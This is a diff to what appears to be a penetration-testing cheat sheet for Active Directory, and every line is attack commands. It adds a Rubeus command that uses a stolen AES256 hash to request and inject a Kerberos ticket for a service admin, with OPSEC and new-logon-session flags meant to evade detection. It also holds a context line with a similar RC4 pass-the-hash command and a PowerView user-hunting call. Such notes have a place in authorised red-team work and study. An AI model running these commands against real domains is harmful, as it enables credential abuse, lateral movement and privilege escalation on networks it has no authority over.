@@ -9,7 +9,9 @@ winrs -r:<MACCHINA> cmd
 ```powershell
 rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
 ```
-
+```powershell
+Rubeus.exe asktgt /user:svcadmin /aes256:<HASH> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
 ### **Other Sessions Opened**
 ```powerview
 Find-DomainUserLocation
